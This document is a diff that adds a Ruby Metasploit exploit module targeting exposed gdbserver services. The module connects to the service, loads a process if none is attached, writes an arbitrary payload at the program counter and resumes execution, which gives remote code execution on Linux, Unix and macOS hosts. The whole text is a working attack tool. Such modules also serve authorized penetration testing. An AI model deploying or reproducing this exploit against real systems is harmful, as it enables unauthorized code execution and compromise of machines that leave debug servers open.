@@ -1,0 +1,84 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  include Msf::Exploit::Remote::Gdb
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'          => 'GDB Server Remote Payload Execution',
+      'Description'   => %q{
+          This module attempts to execute an arbitrary payload on a loose gdbserver service.
+      },
+      'Author'        => [ 'joev' ],
+      'Targets'       => [
+        [ 'x86 (32-bit)',    { 'Arch' => ARCH_X86 } ],
+        [ 'x86_64 (64-bit)', { 'Arch' => ARCH_X86_64 } ]
+      ],
+      'References'     =>
+        [
+          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/3691']
+        ],
+      'DisclosureDate' => 'Aug 24 2014',
+      'Platform'      => %w(linux unix osx),
+      'DefaultTarget' => 0,
+      'DefaultOptions' => {
+        'PrependFork' => true
+      }
+    ))
+
+    register_options([
+      OptString.new('EXE_FILE', [
+        false,
+        "The exe to spawn when gdbserver is not attached to a process.",
+        '/bin/true'
+      ])
+    ], self.class)
+  end
+
+  def exploit
+    connect
+
+    print_status "Performing handshake with gdbserver..."
+    handshake
+
+    enable_extended_mode
+
+    begin
+      print_status "Stepping program to find PC..."
+      gdb_data = process_info
+    rescue BadAckError, BadResponseError
+      # gdbserver is running with the --multi flag and is not currently
+      # attached to any process. let's attach to /bin/true or something.
+      print_status "No process loaded, attempting to load /bin/true..."
+      run(datastore['EXE_FILE'])
+      gdb_data = process_info
+    end
+
+    gdb_pc, gdb_arch = gdb_data.values_at(:pc, :arch)
+
+    unless payload.arch.include? gdb_arch
+      fail_with(
+        Msf::Exploit::Failure::BadConfig,
+        "The payload architecture is incorrect: "+
+        "the payload is #{payload.arch.first}, but #{gdb_arch} was detected from gdb."
+      )
+    end
+
+    print_status "Writing payload at #{gdb_pc}..."
+    write(payload.encoded, gdb_pc)
+
+    print_status "Executing the payload..."
+    continue
+
+    handler
+    disconnect
+  end
+
+end
